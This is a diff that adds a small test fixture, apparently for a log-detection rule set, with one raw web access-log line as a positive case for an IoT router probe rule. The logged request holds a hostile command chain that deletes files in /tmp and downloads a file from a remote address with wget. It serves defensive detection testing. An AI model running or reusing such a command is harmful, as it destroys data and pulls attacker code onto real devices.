@@ -1,0 +1,3 @@
+# Raw-line examples for web- content rules, added where the rule sample alone cannot show a real log line behaves.
+{"schema":"kavach-content-tests/1","name":"web content rules, raw log lines"}
+{"case":"web-recon-iot-router-probe positive: plain plus signs in the query (the form a scanner really sends)","kind":"web","format":"combined","lines":["203.0.113.7 - - [15/Jan/2026:10:00:00 +0000] \"GET /shell?cd+/tmp;rm+-rf+*;wget+http://198.51.100.9/a HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\""],"rule":"web-recon-iot-router-probe","polarity":"positive"}
